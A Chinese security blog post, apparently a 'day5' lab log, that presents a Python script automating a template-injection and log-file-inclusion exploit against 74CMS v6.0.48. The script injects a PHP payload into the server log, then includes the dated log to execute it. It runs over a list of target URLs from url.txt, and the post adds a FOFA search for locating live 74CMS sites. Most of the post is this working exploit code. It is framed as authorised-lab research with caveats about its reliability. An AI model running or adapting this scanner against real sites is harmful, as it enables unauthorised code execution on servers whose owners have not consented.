ailx10说：这篇是2024年8月之前写的，后来又改过。day5 继续做骑士 CMS，我把写日志和包含日志的两步接成程序。先发前一段请求，再按日期构造日志路径，看第二次返回里有没有 phpinfo，流程终于不只是手工点两下。可日期看起来简单，客户端和服务器时区不同就可能找错文件，第一步返回也不能只认一个状态码。这篇是把具体实验搬进脚本时的记录，提醒我自动化还得照顾现场环境。能跑通一次很高兴，但程序接下来遇到意外时怎么留下信息，同样得设计进去。

day5自动提交骑士CMS模板载荷，首响应404后按本机日期包含日志，第二次200并含PHP Version记成功。

核查提示：只允许首步404脆弱且服务端时区可能不同；无超时及输出生成代码副作用，正文是已知链复用不是新漏洞发现。 原实验和代码未重新运行，图内细节有待核验。

本文整理历史模板与文件包含链的自动化记录。该流程可能创建文件或执行代码，应仅在授权隔离环境中使用。

- 找到对应的POC：[ailx10：骑士CMS v6.0.48 模版注入\+文件包含漏洞复现](/posts/a0380/)
- 找到对应的网站：FOFA搜索`body="74CMS"`

下面是原记录中的示例代码；其输入、异常处理和作用范围需要结合实验环境审查。

原脚本依赖首个响应状态及本机日期，服务器时区和响应差异可能影响结果。

```
import re
import os
import csv
import requests
from datetime import datetime

class CMS74():
    def __init__(self):
        self.version = "-1"
        self.vuln_exist = "-1"
        self.vuln_success_url = "-1"
        self.vuln_success_result = "-1"

    def check_vulnerability(self,url):
        try:
            version_url = "{}/index.php?m=admin&c=index&a=login".format(url)
            response = requests.get(version_url)
            version_pattern = r'Powered by.*?(\w+\s\w+\.\d+.\d+)'
            match = re.search(version_pattern, response.text)

            if match:
                self.version = match.group(1)
                print("74Cms版本:{}".format(self.version))
            else:
                print("74Cms版本:未知")

            headers = {
                "content-type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
            }

            body = "variable=1&tpl=<?php phpinfo(); ob_flush();?>/r/n<qscms/company_show 列表名=\"info\" 企业id=\"$_GET['id']\"/>"
            vuln_url = "{}/index.php?m=home&a=assign_resume_tpl".format(url)
            if url.startswith("https://"):
                response = requests.post(vuln_url,headers=headers,data=body.encode('utf-8') ,verify=False)
            else:
                response = requests.post(vuln_url, headers=headers,data=body.encode('utf-8') )
            if response.status_code == 404:
                formatted_date = datetime.now().strftime('%y_%m_%d')
                body = "variable=1&tpl=data/Runtime/Logs/Home/{}.log".format(formatted_date)
                if url.startswith("https://"):
                    response = requests.post(vuln_url, headers=headers, data=body.encode('utf-8'), verify=False)
                else:
                    response = requests.post(vuln_url, headers=headers, data=body.encode('utf-8'))
                if response.status_code == 200:
                    if "PHP Version" in response.text:
                        print("vuln exist:{}".format(url))
                        self.vuln_exist = 1
                        self.vuln_success_result = 1
                        self.vuln_success_url = vuln_url
                    else:
                        print("no vuln:{}".format(url))
                        self.vuln_exist = 0
                else:
                    print("response2.status_code={}".format(response.status_code))
            else:
                print("response1.status_code={}".format(response.status_code))
        except Exception as e:
            print("网络异常:{}".format(e))


    def append_data_to_csv(self,file_name, data):
        file_path = os.path.join(os.getcwd(), file_name)
        file_exists = False
        if os.path.exists(file_path):
            file_exists = True
        with open(file_path, 'a+', newline='') as csvfile:
            writer = csv.writer(csvfile)
            if not file_exists:
                writer.writerow(data.keys())
            writer.writerow(data.values())




if __name__ == "__main__":
    test_url_list = []
    now = datetime.now()
    date_string = now.strftime("%Y-%m-%d")
    with open('url.txt', 'r', encoding='utf-8') as file:
        for line in file:
            test_url_list.append(line.strip())
    for url in test_url_list:
        cms = CMS74()
        url = url[:-1] if url.endswith("/") else url
        cms.check_vulnerability(url)

        url_vuln_info = {
                "url":url,
                "version":cms.version,
                "vuln_exist":cms.vuln_exist,
                "vuln_success_url":cms.vuln_success_url,
                "vuln_success_result":cms.vuln_success_result,
                "date_string":date_string
            }
        cms.append_data_to_csv("out.csv",url_vuln_info)
```
